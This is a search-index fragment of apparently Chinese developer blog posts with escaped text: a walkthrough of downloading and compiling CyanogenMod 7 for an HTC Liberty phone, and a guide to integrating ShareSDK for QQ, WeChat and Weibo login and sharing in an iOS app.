(1)\u3001\u9ed8\u8ba4\u5c06htc\u7c7b\u578b\u624b\u673a\u901a\u8fc7usb\u8fde\u63a5\u4e0a\u7535\u8111\u4e4b\u540e\uff0c\u4f7f\u7528adb devices\u662f\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u624b\u673a\u8bbe\u5907\u7684\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a tip\uff1a\u8fd9\u91cc\u8981\u4f7f\u7528\u5230adb\u5de5\u5177\uff0c\u5982\u679cubuntu\u7cfb\u7edf\u5b89\u88c5\u4e86android eclipse\u5f00\u53d1\u5de5\u5177\uff0c\u9ed8\u8ba4\u662f\u81ea\u5e26adb\u5de5\u5177\u7684\u3002 (2)\u3001\u5c06\u8bbe\u5907\u8fde\u63a5\u4e0a\u7535\u8111\uff0c\u67e5\u770b\u624b\u673a\u7684usb\u8bbe\u5907\uff1a ubuntu@andy-laptop:~$lsusb htc \u624b\u673a\u5bf9\u5e94\u7684usb\u8bbe\u5907\u4fe1\u606f\u5982\u4e0b\uff1a Bus 002 Device 004: ID 0bb4:0c92 High Tech Computer Corp. \u5982\u4e0b\u56fe\u6240\u793a\uff1a (3)\u3001\u4fee\u653951-android.rules\u6587\u4ef6\uff1a ubuntu@andy-laptop:sudo gedit /etc/udev/rules.d/51-android.rules \u6dfb\u52a0\u4e00\u884c\u4fe1\u606f\uff0c\u7279\u522b\u6ce8\u610f\uff0cATTR{idVendor} \u4e0eATTR{idProduct}\u7684\u503c\u5206\u522b\u4e8eID 0bb4:0c92\u5bf9\u5e94\u3002 # fastboot protocol onmanta (htc liberty) SUBSYSTEM==\"usb\",ATTR{idVendor}==\"0bb4\", ATTR{idProduct}==\"0c92\",MODE=\"0600\", OWNER=\"ubuntu\" \u5982\u4e0b\u56fe\u6240\u793a\uff1a (4)\u3001\u4fdd\u5b58\u6587\u4ef6\u540e\uff0c\u91cd\u65b0\u5c06\u624b\u673a\u8fde\u63a5\u5230\u7535\u8111\uff0c\u4f7f\u7528adb devices\u67e5\u770b\u8bbe\u5907\u7684\u8fde\u63a5\u72b6\u6001\uff0c\u53ef\u53d1\u73b0\u5df2\u7ecf\u62e5\u6709\u4e86\u8bbf\u95eeusb\u7684\u6743\u9650\u3002 (5)\u3001\u8be6\u7ec6\u8bf7\u53c2\u8003\uff1a http://source.android.com/source/initializing.html Configuring USB Access\u5c0f\u8282","title":"\u4e8c\u3001\u73af\u5883\u642d\u5efa"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_3","text":"1\u3001 \u5b89\u88c5Repo //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u5f00\u59cb $ mkdir ~/bin $ PATH=~/bin:$PATH $ curl http://commondatastorage.googleapis.com/git-repo-downloads/repo > ~/bin/repo $ chmod a+x ~/bin/repo 2\u3001\u4e0b\u8f7d\u6e90\u7801 (1)\u3001 \u5982\u4f55\u9009\u62e9\u5206\u652f \u7b14\u8005\u7684\u624b\u673a\u662fhtc G9,\u652f\u6301\u7684CM verison :gingerbread\uff0c\u9009\u62e9\u624b\u673a\u8bbe\u5907\u6240\u652f\u6301\u5206\u652f\u7684\u8be6\u7ec6\u6b65\u9aa4\uff0c\u8bf7\u53c2\u8003\u672cblog 1.2\u3001\u624b\u673a\u8bbe\u5907\u652f\u6301\u7684CM\u7248\u672c\u53f7 \u7b14\u8005\u6700\u7ec8\u9009\u62e9\u7684\u5206\u652f\u662f\uff1agingerbread-release \u67e5\u770b https://github.com/CyanogenMod/android.git \u4e0b\u6240\u652f\u6301\u7684\u6240\u6709\u5206\u652f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u662f\u5206\u652fgingerbread-release\u3002 (2)\u3001\u4f7f\u7528repo\u6267\u884c\u4e0b\u8f7d //\u4ece\u7528\u6237\u6839\u76ee\u5f55\u4e0b\u5f00\u59cb,\u5206\u522b\u521b\u5efa\u6587\u4ef6\u5939CyanogenMod/android/CM-7 $cd ./CyanogenMod/android/CM-7 //\u83b7\u53d6gingerbread-release\u7684\u5206\u652f\u6e90\u4ee3\u7801 $repo init -u git://github.com/CyanogenMod/android.git -b gingerbread-release //\u540c\u6b65\u670d\u52a1\u5668\u4ee3\u7801\u5230\u672c\u5730\uff0c-j16\u636e\u7f51\u53cb\u53cd\u5e94\u662f\u591a\u5f00\u7f51\u7edc\u8fde\u63a5\uff0c\u4ece\u800c\u80fd\u63d0\u9ad8\u4e0b\u8f7d\u901f\u5ea6 $repo sync -j16 repo\u547d\u4ee4\u4f7f\u7528\u53c2\u8003\uff1a http://source.android.com/source/using-repo.html \u7279\u522b\u63d0\u9192\uff1a\u5173\u4e8egingerbread\u5206\u652f\uff0c\u6211\u4e0b\u8f7d\u4e4b\u540e\uff0c\u53d1\u73b0CyanogenMod/android/CM-7/device\u76ee\u5f55\u91cc\u6ca1\u6709htc\u3001\u4e09\u661f\u4e00\u7cfb\u5217\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\uff0c\u6298\u817e\u4e86\u597d\u957f\u4e00\u6bb5\u65f6\u95f4\uff0c\u6700\u7ec8\u9009\u62e9gingerbread-release\u5206\u652f\u4e0b\u8f7d\u6e90\u7801\uff0c\u5728CyanogenMod/android/CM-7/device\u76ee\u5f55\u6210\u529f\u83b7\u5f97\u591a\u6b3e\u624b\u673a\u5bf9\u5e94\u7684\u7248\u672c\u3002 \u4e0b\u8f7d\u6210\u529f\u540e\uff0c\u5728CyanogenMod/android/CM-7/device\u6587\u4ef6\u5939\u4f1a\u5305\u542b\u5982\u4e0b\u6240\u793a\u6587\u4ef6\u5939\uff0c\u4ee5\u6b64\u5224\u65ad\u6e90\u7801\u662f\u5426\u4e0b\u8f7d\u5b8c\u6574\u3002\u53d1\u73b0device\u6587\u4ef6\u5939\u91cc\u5df2\u7ecf\u5305\u542b\u4e86htc\u6587\u4ef6\u5939\uff0c\u5982\u56fe\u6240\u793a\uff1a \u70b9\u51fbhtc\u6587\u4ef6\u5939\u8fdb\u5165\u53ef\u53d1\u73b0liberty\u5df2\u5b89\u9759\u7684\u8eba\u5728\u90a3\uff0c\u5982\u56fe\u6240\u793a\uff1a","title":"\u4e09\u3001\u4e0b\u8f7d\u6e90\u7801"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_4","text":"1\u3001 \u8bfb\u53d6\u624b\u673a\u4e0a\u7684\u4e00\u4e9b\u79c1\u6709\u914d\u7f6e\u6587\u4ef6 \u5c06htc\u624b\u673a\u8fde\u63a5\u4e0aubuntu\u7cfb\u7edf\uff0c\u53ef\u80fd\u6ca1\u6709usb\u8bbf\u95ee\u6743\u9650\uff0c\u5177\u4f53\u8bf7\u53c2\u80032.4 \u914d\u7f6eUSB\u8bbf\u95ee\u6743\u9650 $cd ~/CyanogenMod/android/CM-7/device/htc/liberty $./extract-files.sh 2\u3001 \u751f\u6210\u7f16\u8bd1\u811a\u672c\u6587\u4ef6 $cd ~/CyanogenMod/android/CM-7/vendor/cyanogen $./get-rommanager $./extract-google-files //\u590d\u5236\u7f16\u8bd1\u811a\u672c\u6587\u4ef6\u5230\u76ee\u5f55\u4e0b\uff0c\u540e\u9762\u7f16\u8bd1\u6574\u4e2a\u7cfb\u7edf\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u6587\u4ef6 $cp ~/CyanogenMod/android/CM-7/vendor/cyanogen/products/cyanogen_lieberty.mk ~/CyanogenMod/android/CM-7/buildspec.mk \u6267\u884c./get-rommanager\u8fd0\u884c\u7ed3\u679c\u5982\u56fe\u6240\u793a\uff1a 3\u3001 \u7f16\u8bd1\u811a\u672c \u56de\u5230CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\uff0c\u6267\u884c\u811a\u672c\u3002 //\u521d\u59cb\u5316\u811a\u672c\uff0c\u8fd9\u4e2a\u662f\u540e\u9762\u7684\u91cd\u8981\u57fa\u7840\u6b65\u9aa4 $cd ~/CyanogenMod/android/CM-7 $source build/envsetup.sh //\u9009\u62e9\u7f16\u8bd1\u7684\u4ea7\u54c1\uff0c\u8fd9\u4e2a\u547d\u4ee4\u9700\u8981\u4e00\u5c0f\u4f1a\u513f\u65f6\u95f4\uff0c\u4f46\u662f\u53c8\u6ca1\u63d0\u793a\uff0c\u8010\u6027\u7b49\u5f85\u4e00\u4e0b //\u6216\u76f4\u63a5\u6267\u884clunch\u547d\u4ee4\uff0c\u67e5\u770blist\u9009\u9879\u6765\u9009\u62e9\u6267\u884c\u54ea\u4e2a\u7248\u672c $lunch cyanogen_liberty-eng //\u5f00\u59cb\u7f16\u8bd1 $make -j4 CYANOGEN_WITH_GOOGLE=true otapackage \u6267\u884clunch\u547d\u4ee4\uff0c\u9009\u62e9119\uff0c\u663e\u793a\u4fe1\u606f\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7f16\u8bd1\u6210\u529f\u663e\u793a\u5982\u4e0b\u4fe1\u606f\uff0c\u8fd9\u5f20\u56fe\u7247\u6765\u7684\u76f8\u5f53\u4e0d\u5bb9\u6613\uff0c\u534a\u591c\u8d77\u6765\u622a\u7684\u56fe: 4\u3001\u7f16\u8bd1\u53ef\u80fd\u4ea7\u51fa\u7684\u9519\u8bef\u5206\u6790\uff08\u5982\u679c\u6ca1\u6709\u95ee\u9898\u53ef\u76f4\u63a5\u8df3\u8fc7\uff0c\u6267\u884c\u7b2c5\u6b65\uff1a\u751f\u6210\u5237\u673azip\u5305\u64cd\u4f5c\uff09\uff1a \u9519\u8bef\u539f\u56e0\uff1a\u65e0\u6cd5\u8bbf\u95ee\u6587\u4ef6: corrupted zip file \u9519\u8bef\u539f\u56e0\u5206\u6790\uff1a\u6ca1\u6709\u9009\u62e9\u6b63\u786ejar\u7248\u672c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u9009\u62e9\u7684\u662f/usr/bin/fastjar\u81ea\u52a8\u6a21\u5f0f\uff0c\u901a\u8fc7sudo update-alternatives --config jar\u9009\u62e9jdk6\u5373\u53ef\u3002 \u95ee\u9898\u89e3\u51b3\uff1a 32\u4f4dubuntu\u7f16\u8bd1android2.3,\u65e0\u6cd5\u8bbf\u95ee java.lang.Object\u95ee\u9898 http://hi.baidu.com/cmdmac/item/93920ff30164270884d278a4 \u7f16\u8bd1android 2.3.4\u7684\u4e00\u4e2a\u9519\u8bef http://blog.163.com/covel_zhang/blog/static/81641365201223122541768/ 5\u3001\u751f\u4ea7\u5237\u673azip\u5305\u3002 \u5728CyanogenMod/android/CM-7\u76ee\u5f55\u4e0b\u6267\u884c\u5982\u4e0b\u811a\u672c\uff1a $./vendor/cyanogen/tools/squisher \u751f\u6210\u56fa\u4ef6\u5305\u6210\u529f\uff0c\u663e\u793a\u5982\u4e0b\u56fe\u6240\u793a\u4fe1\u606f\uff1a","title":"\u56db\u3001\u7f16\u8bd1\u6e90\u7801"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_5","text":"\u5c06cm-7-20131119-UNOFFCIAL-liberty.zip\u5305\u5237\u5230\u6211htc\u624b\u673a\u4e0a\u4e00\u5207\u6b63\u5e38\uff0c\u6709\u56fe\u6709\u771f\u76f8\uff0c\u7559\u5fc3\"\u5173\u4e8e\u624b\u673a\"\u4fee\u8ba2\u7248\u672c\u9009\u9879\uff0c\u6b63\u662f\u7b2c5\u6b65\u751f\u6210\u7684\u5237\u673a\u5305cm-7-20131119-UNOFFCIAL-liberty.zip\u3002","title":"\u4e94\u3001\u5237\u673a"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_6","text":"Android\u62d3\u5c55\u7cfb\u5217(5)--CyanogenMod\u6e90\u7801\u4e0b\u8f7d\u548c\u7f16\u8bd1(Android ROM\u5b9a\u5236\u57fa\u7840\u7bc7) Android \u7b2c\u4e09\u65b9ROM CyanogenMod \u6e90\u7801\u4e0b\u8f7d\uff0c\u7f16\u8bd1\uff0c\u5237\u673a http://source.android.com/source/initializing.html http://source.android.com/source/building.html","title":"\u516d\u3001\u53c2\u8003\uff1a"},{"location":"Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/#_7","text":"\u672c\u6587\u4ee5\u7b14\u8005\u81ea\u8eab\u7684CyanogenMod\u6e90\u7801\u7f16\u8bd1\u6298\u817e\u7ecf\u5386\u63cf\u8ff0\u4e86\u5229\u7528\u7b2c\u4e09\u65b9\u5f00\u6e90\u7cfb\u7edf\u5b9a\u5236\u4e2a\u6027\u5316ROM\u7684\u8fc7\u7a0b\uff0c\u4e4b\u6240\u4ee5\u8981\u8bb0\u5f55\u8fd9\u7bc7\u535a\u6587\uff0c\u5b8c\u5168\u662f\u672c\u7740\u524d\u4eba\u683d\u6811\u540e\u4eba\u4e58\u51c9\u7684\u5b97\u65e8\uff0c\u8ba9\u9047\u5230\u540c\u6837\u9700\u6c42\u7684\u5f00\u53d1\u8005\u4e0d\u81f3\u4e8e\u50cf\u7b14\u8005\u5982\u6b64\u6298\u817e\uff0c\u6216\u8005\u8bf4\u6298\u817e\u7684\u5c11\u4e00\u4e9b\uff0c\u5982\u6b64\uff0c\u7b14\u8005\u5fc3\u6ee1\u610f\u8db3\u3002\u6700\u540e\uff0c\u672c\u535a\u6587\u867d\u7ecf\u7b14\u8005\u591a\u6b21\u6821\u9a8c\uff0c\u4f46\u96be\u514d\u4f1a\u6709\u758f\u6f0f\u4e4b\u5904\uff0c\u656c\u8bf7\u6307\u6b63\uff0c\u7b14\u8005\u5c06\u5728\u7b2c\u4e00\u65f6\u95f4\u7ed9\u4e88\u7b54\u590d\u6307\u6b63\u3002 \u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\uff1ahttp://blog.csdn.net/andie_guo/article/details/16879443 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/andie_guo/article/details/16879443","title":"\u4e03\u3001\u5c0f\u7ed3\uff1a"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/","text":"\u8fd9\u51e0\u5929\u9047\u5230\u4e00\u4e2a\u9700\u6c42\uff1a\u505a\u7b2c\u4e09\u65b9\u767b\u5f55\u548c\u5206\u4eab\u3002\u9047\u5230\u4e86\u4e00\u4e9b\u5751\uff0c\u628a\u6574\u4e2a\u8fc7\u7a0b\u6574\u7406\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4ed6\u4eba\uff0c\u540c\u65f6\u4e5f\u634b\u4e00\u4e0b\u601d\u8def\u3002 \u5f53\u65f6\u8003\u8651\u8fc7\u628a\u6bcf\u4e2a\u5e73\u53f0\u7684SDK\u4e0b\u8f7d\u4e0b\u6765\uff0c\u4e00\u4e2a\u4e00\u4e2a\u5f04\uff0c\u4e00\u756a\u53d6\u820d\u540e\u51b3\u5b9a\u8fd8\u662f\u7528ShareSDK\u3002\u8fd9\u91cc\u53ea\u505a\u4e86 \u5fae\u535a\u3001\u5fae\u4fe1\u548cQQ \u3002\u8fc7\u7a0b\u5982\u4e0b\uff1a 1.\u53bb ShareSDK\u5b98\u7f51 \u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u65b9\u4fbf\u4ee5\u540e\u5bf9ShareSDK\u7684\u914d\u7f6e\u3002 2.\u6309\u7167\u96c6\u6210\u6587\u6863\u7684\u6b65\u9aa4\u5f00\u59cb\u505a\uff0c\u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u4e2a\u96c6\u6210\u6587\u6863\u91cc\u9762\u6709\u5751\uff0c\u6709\u5751\u7684\u5730\u65b9\u6211\u4f1a\u6307\u51fa\u3002 3.\u6dfb\u52a0\u4e00\u4e2a\u5e94\u7528\u3002\u6709\u5f88\u591a\u79cd\u65b9\u5f0f\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u5e94\u7528\uff0c\u591a\u70b9\u70b9\u3002\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e00\u4e2atest\u5e94\u7528\u3002 \u8fd9\u91cc\u7684App Key\u548cApp Secret\uff08\u4e0d\u663e\u793a\u7684\u8bdd\uff0c\u70b9\u51fb\u663e\u793a\uff09\u5f88\u91cd\u8981\uff0c\u53ef\u4ee5\u7528\u6765\u521d\u59cb\u5316ShareSDK\uff0c 4.\u4e0b\u8f7dSDK\u3002 \u4e0b\u8f7dSDK \u8fd9\u91cc\u662f\u7b2c\u4e00\u4e2a\u5751 \uff0c\u867d\u7136\u4f60\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e0b\u8f7dSDK\uff0c \u5982\u679c\u4f60\u505aQQ\u5206\u4eab\u548c\u767b\u5f55\uff0c\u4e00\u5b9a\u4e0d\u8981\u5fd8\u8bb0\u4e0b\u8f7dQQ\u7a7a\u95f4\u7684SDK \u3002\u56e0\u4e3aQQ\u672c\u8eab\u4e0d\u652f\u6301\u7b2c\u4e09\u65b9\u767b\u5f55\uff0c\u4f46\u652f\u6301\u7b2c\u4e09\u65b9\u5206\u4eab\u5305\u62ecQQ\u7a7a\u95f4\u5206\u4eab\uff0cQQ\u7a7a\u95f4\u652f\u6301\u7b2c\u4e09\u65b9\u767b\u5f55\uff0c\u6240\u4ee5\u5982\u679c\u4f60\u505aQQ\u5206\u4eab\u548c\u767b\u5f55\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u4e0b\u8f7dQQ\u7a7a\u95f4\u7684SDK\u3002 \u5982\u679c\u53ea\u505a\u5206\u4eab\uff0c\u90a3\u53ea\u4e0b\u8f7dQQ\u7684\u5c31\u884c \u3002\u8fd9\u91cc\u6211\u88ab\u5751\u8fc7\uff0cShareSDK\u63d0\u4f9b\u7684\u6587\u6863\u91cc\u9762\u6ca1\u6709\u8bf4\u660e\u3002 5.\u628a\u4e0b\u8f7d\u7684ShareSDK\u6dfb\u52a0\u5230\u9879\u76ee\u4e2d\u3002 \u5230\u73b0\u5728\u4e3a\u6b62\u8fd0\u884c\u9879\u76ee\u662f\u4f1a\u62a5\u9519\u7684\uff0c\u539f\u56e0\u662f\u6ca1\u6709\u6dfb\u52a0\u76f8\u5173\u7684\u4f9d\u8d56\u5e93\u3002 6.\u6dfb\u52a0\u76f8\u5173\u7684\u4f9d\u8d56\u5e93\u3002 \u4ee5\u4e0b\u6458\u81eaShareSDK\u63d0\u4f9b\u7684\u6587\u6863\u3002 \u5fc5\u987b\u6dfb\u52a0\u7684\u4f9d\u8d56\u5e93\u5982\u4e0b\uff1a SystemConfiguration.framework QuartzCore.framework CoreTelephony.framework libicucore.dylib libz.1.2.5.dylib Security.framework \u4ee5\u4e0b\u4f9d\u8d56\u5e93\u6839\u636e\u793e\u4ea4\u5e73\u53f0\u6dfb\u52a0 \u65b0\u6d6a\u5fae\u535aSDK\u4f9d\u8d56\u5e93 \uff08\u4ecev2.10.5\u5f00\u59cb\uff09 ImageIO.framework QQ\u597d\u53cb\u548cQQ\u7a7a\u95f4SSO\u5fc5\u8981\uff08\u65b0\u6ce8\u518c\u817e\u8baf\u5f00\u653e\u5e73\u53f0\u5e10\u53f7\u53ea\u652f\u6301SSO\u6388\u6743\uff0c\u53ea\u662f\u8001\u5f00\u53d1\u8005\u624d\u53ef\u4ee5\u4f7f\u7528\u7f51\u9875\u6388\u6743\uff09 libstdc++.dylib libsqlite3.dylib \u5230\u8fd9\u91cc\u8fd0\u884c\u9879\u76ee\u662f\u4e0d\u4f1a\u62a5\u9519\u7684\uff0c\u5982\u679c\u62a5\u9519\uff0c\u68c0\u67e5\u6dfb\u52a0\u7684\u4f9d\u8d56\u5e93\u662f\u7f3a\u4e86\u3001\u6f0f\u4e86\u3001\u8fd8\u662f\u9519\u4e86\u3002 \u5728 AppDelegate.m \u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u5934\u6587\u4ef6\uff0c\u518d\u8fd0\u884c\u9879\u76ee\u770b\u770b\uff0c\u8fd9\u662f\u4e0d\u4f1a\u62a5\u9519\u7684\uff0c\u5982\u679c\u62a5\u9519\u770b\u63d0\u793a\u4fe1\u606f\uff0c\u591a\u641c\u7d22\uff0c\u76f8\u4fe1\u662f\u80fd\u591f\u89e3\u51b3\u7684\u3002 #import <ShareSDK/ShareSDK.h> #import <TencentOpenAPI/QQApiInterface.h> #import <TencentOpenAPI/TencentOAuth.h> #import \"WXApi.h\" #import \"WeiboSDK.h\" 7.\u5230\u76f8\u5e94\u5f00\u53d1\u8005\u5e73\u53f0\u6ce8\u518c\u5f00\u53d1\u8005\u8d26\u53f7\uff0c\u5e76\u6dfb\u52a0\u4f60\u8981\u8fdb\u884c\u5206\u4eab\u548c\u4f7f\u7528\u7b2c\u4e09\u65b9\u767b\u5f55\u5e94\u7528\u7684\u4fe1\u606f\u3002 \u6dfb\u52a0\u65b0\u6d6a\u5fae\u535a\u5e94\u7528 \u6ce8\u518c\u7f51\u5740 http://open.weibo.com \u6dfb\u52a0QQ\u5e94\u7528 \u6ce8\u518c\u7f51\u5740 http://mobile.qq.com/api/ \u6dfb\u52a0\u5fae\u4fe1\u5e94\u7528 http://open.weixin.qq.com \u6ce8\u610f\uff1a\u8fd9\u4e09\u5bb6\u7684\u5f00\u653e\u5e73\u53f0\uff0c\u76ee\u524d\u4e3a\u6b62\uff0c\u9875\u9762\u505a\u7684\u90fd\u8ddf\u5c71\u5be8\u7f51\u7ad9\u4f3c\u7684\uff08\u5fae\u4fe1\u7684\u597d\u4e00\u70b9\uff09\uff0c\u5947\u5361\u65e0\u6bd4\u3002\u5f53\u7136\u8fd9\u4e0d\u662f\u5410\u69fd\u7684\u91cd\u70b9\uff0c\u91cd\u70b9\u662f\u6ce8\u518c\u6d41\u7a0b\u7e41\u7410\uff0c\u8fd8\u8981\u8ba4\u8bc1\u5f00\u53d1\u8005\u8eab\u4efd\uff0c\u9700\u8981\u7b49\u4e00\u4e2a\u5de5\u4f5c\u65e5\u3002\u5176\u4e2d\u5982\u679c\u505a\u5fae\u4fe1\u767b\u5f55\u7684\u8bdd\uff0c\u6bcf\u5e74\u8981\u4ea4300\u5143\u7684\u4ec0\u4e48\u8d39\u3002\u8fd9\u91cc\u6ca1\u6709\u4ec0\u4e48\u96be\u5ea6\u5c31\u662f\u4e2a\u4f53\u529b\u6d3b\uff0c\u5c31\u4e0d\u8be6\u8bf4\u4e86\uff0c\u6709\u4ec0\u4e48\u7591\u95ee\uff0c\u8bf7\u7559\u8a00\uff0c\u4f60\u7684\u7559\u8a00\u4e5f\u662f\u5bf9\u6211\u7684\u4fe1\u4efb\u548c\u652f\u6301\u3002 \u6ce8\u518c\u5b8c\uff0c\u7533\u8bf7\u5b8c\u5c31\u53ef\u4ee5\u62ff\u5230AppID\u3001AppSecret\u3001AppKey\u7b49\u4e1c\u897f\u3002 \u6ce8\uff1aQQ\u7684AppKey\u5728ShareSDK\u4e2d\u53ebAppSecret\u3002 \u540d\u5b57\u4e0d\u7edf\u4e00\uff0c\u8fd9\u4e2a\u6bd4\u8f83\u626f\u6de1\u3002 \u62ff\u5230\u8fd9\u4e9bAppID\u3001AppSecret\u3001AppKey\u7b49\u4e1c\u897f\u540e\u5c31\u53ef\u4ee5\u5f00\u59cb\u5bf9ShareSDK\u8fdb\u884c\u521d\u59cb\u5316\u3002 \u5728 AppDelegate.m \u4e2d\u6dfb\u52a0\u4e0b\u9762\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5e76\u8bb0\u5f97\u5728 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions \u65b9\u6cd5\u4e2d\u8c03\u7528\u3002 - (void)initShareSDK { [ShareSDK registerApp:@\"884a1b86xxxx\"]; //\u5bf9\u65b0\u6d6a\u5fae\u535aSDK\u8fdb\u884c\u521d\u59cb\u5316 [ShareSDK connectSinaWeiboWithAppKey:@\"406116xxxx\" appSecret:@\"b6a542582057e39a6fca582b14dxxxxxx\" redirectUri:@\"http://www.xxxx.com\"]; //\u6ce8\u8fd9\u91cc\u7684redirectUri\u8981\u4e0e\u4f60\u5728\u65b0\u6d6a\u5fae\u535a\u5f00\u653e\u5e73\u53f0\u4e0a\u586b\u5199\u7684\u90a3\u4e2a\u6388\u6743\u56de\u8c03\u9875\u7684URL\u4fdd\u6301\u4e00\u81f4\uff0c\u5426\u5219\u5728\u4f7f\u7528\u5fae\u535a\u767b\u5f55\u7684\u65f6\u5019\u4f1a\u62a5\u4e00\u4e2aredirectUri\u627e\u4e0d\u5230\u7684\u9519\u8bef\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a\u5751\u3002 //\u7a81\u7136\u53d1\u73b0\u8fd9\u91ccredirectUri\u662f\u4ec0\u4e48\u9b3c\uff1f\u96be\u9053ShareSDK\u7684\u5236\u4f5c\u8005\u6572\u9519\u4e86\uff1f\u4e0d\u5e94\u8be5\u662fURL\u5417\uff1f //QQ\u5206\u4eabSDK\u521d\u59cb\u5316 [ShareSDK connectQQWithQZoneAppKey:@\"110467xxxx\" qqApiInterfaceCls:[QQApiInterface class] tencentOAuthCls:[TencentOAuth class]]; //QQ\u767b\u5f55SDK\u521d\u59cb\u5316 [ShareSDK connectQZoneWithAppKey:@\"1104677455\" appSecret:@\"KnjAB2I0G8Vxxxxx\" qqApiInterfaceCls:[QQApiInterface class] tencentOAuthCls:[TencentOAuth class]]; // \u6ce8\uff1aQQ\u767b\u5f55\u7684appSecret\u53c2\u6570\uff0c\u662f\u4f60\u5728QQ\u5f00\u653e\u5e73\u53f0\u662f\u62ff\u5230\u7684AppKey //\u5bf9\u5fae\u4fe1SDK\u8fdb\u884c\u521d\u59cb\u5316 [ShareSDK connectWeChatWithAppId:@\"wx02e84c8fa45xxxx\" appSecret:@\"ef9006286ce2637caeb648cb58dxxxx\" wechatCls:[WXApi class]]; } 8.\u6dfb\u52a0URL Schemes\u3002 \u70b9\u51fb\uff1a\u9879\u76ee\u540d > TARGETS > info > URL Types \u70b9\u51fb\u6dfb\u52a0URL Types\u3002 \u5728URL Schemes\u540e\u9762\u7684\u6846\u91cc\u6dfb\u4e0a\u5bf9\u5e94\u4fe1\u606f\u3002 \u65b0\u6d6a\u5fae\u535a\u7684URL Schemes\u662f\uff1awb \u52a0\u4e0a\u5728\u5fae\u535a\u5f00\u653e\u5e73\u53f0\u7533\u8bf7\u7684AppKey\u3002 \u5fae\u4fe1\u7684URL Schemes\u662f\uff1a\u5fae\u4fe1\u5f00\u653e\u5e73\u53f0\u7533\u8bf7\u7684AppID\u3002 QQ\u7a7a\u95f4\u7684URL Schemes\u662f\uff1aQQ\u5f00\u653e\u5e73\u53f0\u7533\u8bf7\u7684 tencent \u52a0\u4e0a AppID\u3002\uff08\u5982\u679c\u53ea\u505a\u5206\u4eab\u7684\u8bdd\uff0c\u53ef\u4ee5\u4e0d\u6dfb\u52a0\uff0c\u505a\u767b\u5f55\u7684\u8bdd\u5fc5\u987b\u6dfb\u52a0\uff09 QQ\u7684URL Schemes\u662f\uff1aQQ \u52a0\u4e0a AppID\u768416\u8fdb\u5236\uff08\u5982\u679cAppID\u8f6c\u6362\u768416\u8fdb\u5236\u6570\u4e0d\u591f8\u4f4d\u5219\u5728\u524d\u9762\u88650\uff0c\u5982\u8f6c\u6362\u7684\u662f\uff1a5FB8B52\uff0c\u5219\u6700\u7ec8\u586b\u5165\u4e3a\uff1aQQ05FB8B52 \u6ce8\u610f\uff1a\u8f6c\u6362\u540e\u7684\u5b57\u6bcd\u8981\u5927\u5199\uff09 \u8f6c\u636216\u8fdb\u5236\u7684\u65b9\u6cd5\uff1a echo 'ibase=10;obase=16;801312852'|bc \uff0c\u5176\u4e2d801312852\u4e3aQQ\u7684AppID\uff0c\u89c1\u4e0b\u56fe\uff1a \u6dfb\u52a0\u5b8cURL Schemes\u540e\uff0c\u5728 AppDelegate.m \u6587\u4ef6\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u5bf9URL\u5904\u7406\u7684\u4ee3\u7801\uff1a - (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url { return [ShareSDK handleOpenURL:url wxDelegate:self]; } - (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation { return [ShareSDK handleOpenURL:url sourceApplication:sourceApplication annotation:annotation wxDelegate:self]; } \u5230\u6b64\u7b2c\u4e09\u65b9\u7684\u51c6\u5907\u5de5\u4f5c\u5c31\u7b97\u662f\u505a\u5b8c\u4e86\u3002 9.\u5199\u5206\u4eab\u7684\u4ee3\u7801\u3002 \uff081\uff09\u5728\u754c\u9762\u4e0a\u6dfb\u52a0\u6309\u94ae\uff0c\u5e76\u7ed1\u5b9a\u54cd\u5e94\u4e8b\u4ef6\u3002 \uff082\uff09\u5199\u4e8b\u4ef6\u5904\u7406\u4ee3\u7801\u3002 